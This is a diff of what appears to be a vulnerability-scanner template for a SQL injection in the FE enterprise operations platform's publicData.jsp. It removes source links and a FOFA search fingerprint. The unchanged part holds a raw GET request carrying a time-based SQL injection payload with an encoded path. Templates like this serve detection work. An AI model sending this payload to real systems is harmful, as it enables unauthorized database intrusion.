@@ -3,12 +3,8 @@ info:
   name: 飞企互联-FE企业运营管理平台 publicData.jsp SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yxkf3mgux5pnevbn'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yxkf3mgux5pnevbn
-    fofa: app="飞企互联-FE企业运营管理平台"
 http:
 - raw:
   - 'GET /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db='';waitfor+delay+''0:0:5''-- HTTP/1.1
